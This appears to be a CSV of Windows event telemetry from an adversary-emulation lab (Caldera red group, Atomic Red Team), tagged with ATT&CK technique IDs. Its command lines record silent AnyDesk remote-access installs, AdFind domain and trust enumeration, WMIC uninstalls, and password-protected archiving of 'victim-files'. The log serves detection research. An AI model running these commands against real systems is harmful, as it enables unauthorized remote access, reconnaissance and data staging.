"TPP","EventTime","Level","ParentCommandLine","CommandLine","EventID"
"T1219","2025-04-05T23:45:25.482769300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:45:06.957518200Z","2","","","22"
"T1219","2025-04-05T23:45:02.076133500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:45:01.665256200Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:44:59.347332900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:44:55.874701900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:44:26.162924500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:44:03.784894200Z","2","","","22"
"T1219","2025-04-05T23:43:25.966142800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:42:57.238194500Z","2","","","22"
"T1219","2025-04-05T23:42:26.484905500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:42:22.769366500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:41:26.281368800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:41:12.161051100Z","2","","","22"
"T1219","2025-04-05T23:40:25.706722100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:40:16.438888000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:40:11.454248000Z","2","","","22"
"T1219","2025-04-05T23:40:06.877515500Z","2","","","22"
"T1219","2025-04-05T23:39:25.938126300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:39:00.535207800Z","2","","","22"
"T1053.005","2025-04-05T23:38:51.527068600Z","2","","","99"
"T1027.004","2025-04-05T23:38:37.487153400Z","2"," powershell","\Users\Administrator\AppData\Local\Temp\bbrlehr4\bbrlehr4.cmdline""","1"
"T1219","2025-04-05T23:38:25.550430500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:37:40.855858800Z","2","","","22"
"T1219","2025-04-05T23:37:25.625721600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:36:48.053431400Z","2","","","22"
"T1219","2025-04-05T23:36:25.544312900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:35:48.190054500Z","2","","","22"
"T1219","2025-04-05T23:35:25.958137600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:34:50.503965200Z","2","","","22"
"T1219","2025-04-05T23:34:25.974248500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:33:44.353280300Z","2","","","22"
"T1219","2025-04-05T23:33:25.988758200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:32:47.455727100Z","2","","","22"
"T1219","2025-04-05T23:32:26.173408200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:31:55.466823800Z","2","","","22"
"T1219","2025-04-05T23:31:37.934206900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:31:37.694530100Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:31:36.671928300Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:31:34.198702000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:31:26.072436300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:30:53.344025400Z","2","","","22"
"T1219","2025-04-05T23:30:26.267941000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:29:47.419446900Z","2","","","22"
"T1219","2025-04-05T23:29:26.115540100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:29:03.335202400Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:28:39.382881700Z","2","","","22"
"T1219","2025-04-05T23:28:26.164569000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:27:42.282179200Z","2","","","22"
"T1219","2025-04-05T23:27:26.100392200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:27:20.815989200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:26:44.156441500Z","2","","","22"
"T1219","2025-04-05T23:26:28.137018300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:25:48.300469000Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:25:47.991474000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:25:44.372231500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:25:41.355047800Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:25:28.994113200Z","2","","","22"
"T1219","2025-04-05T23:25:25.973964100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:24:26.104043300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:24:20.060679600Z","2","","","22"
"T1219","2025-04-05T23:23:25.674065600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:23:22.637405700Z","2","","","22"
"T1087.002","2025-04-05T23:23:09.366580200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:22:29.327118200Z","2","","","22"
"T1219","2025-04-05T23:22:29.192538800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:21:45.290431500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C mkdir .\tmp\victim-files && cd .\tmp\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir","1"
"T1219","2025-04-05T23:21:26.544796400Z","2","","","22"
"T1219","2025-04-05T23:21:26.098973400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:20:33.790837100Z","2","","","22"
"T1219","2025-04-05T23:20:26.342496000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:19:25.944904500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:19:22.845649800Z","2","","","22"
"T1219","2025-04-05T23:18:25.760044100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:18:13.391647200Z","2","","","22"
"T1219","2025-04-05T23:18:12.636431000Z","2","","","22"
"T1219","2025-04-05T23:18:12.333395100Z","2","","","22"
"T1219","2025-04-05T23:18:12.040184800Z","2","","","22"
"T1219","2025-04-05T23:18:11.750816400Z","2","","","22"
"T1219","2025-04-05T23:18:11.398682900Z","2","","","22"
"T1047","2025-04-05T23:17:51.812186200Z","2","""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall","""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall","1"
"T1219","2025-04-05T23:17:33.290285900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:32.954490200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:29.087609000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:28.619001200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:27.440515500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:25.459578900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:16:32.904320200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:16:13.802189800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) None","1"
"T1219","2025-04-05T23:16:12.668396400Z","2","","","22"
"T1219","2025-04-05T23:15:32.852287600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:15:09.040304800Z","2","","","22"
"T1219","2025-04-05T23:14:32.641812100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:14:11.177038100Z","2","","","22"
"T1219","2025-04-05T23:13:32.944775900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:13:18.844688200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1087.002","2025-04-05T23:13:16.114029800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) None","1"
"T1219","2025-04-05T23:13:01.299243100Z","2","","","22"
"T1219","2025-04-05T23:12:33.154525900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:12:01.029417700Z","2","","","22"
"T1219","2025-04-05T23:12:00.587645400Z","2","","","22"
"T1219","2025-04-05T23:11:32.895431600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:10:59.972834800Z","3","//ts-caldera.tailce1ce1.ts.net -group red ","//www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" %TEMP%\winrar.exe && %TEMP%\winrar.exe /S) &&   &&mkdir .\tmp\victim-files && cd .\tmp\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir","1"
"T1053.005","2025-04-05T23:10:54.848407800Z","2","","","99"
"T1053.005","2025-04-05T23:10:53.704337600Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.757673500Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.540093600Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.247137700Z","2","","","99"
"T1053.005","2025-04-05T23:10:50.485628900Z","2","","","99"
"T1219","2025-04-05T23:10:32.378636900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:59.286623000Z","2","","","22"
"T1219","2025-04-05T23:09:59.101952200Z","2","","","22"
"T1219","2025-04-05T23:09:58.845817300Z","2","","","22"
"T1219","2025-04-05T23:09:58.670629600Z","2","","","22"
"T1219","2025-04-05T23:09:58.513779600Z","2","","","22"
"T1219","2025-04-05T23:09:58.250823000Z","2","","","22"
"T1562.004","2025-04-05T23:09:57.467157400Z","2","","","99"
"T1562.004","2025-04-05T23:09:54.788837900Z","2","","","99"
"T1219","2025-04-05T23:09:46.197339900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:45.873594800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:41.166314700Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:40.653175400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:35.130143400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:32.270805800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
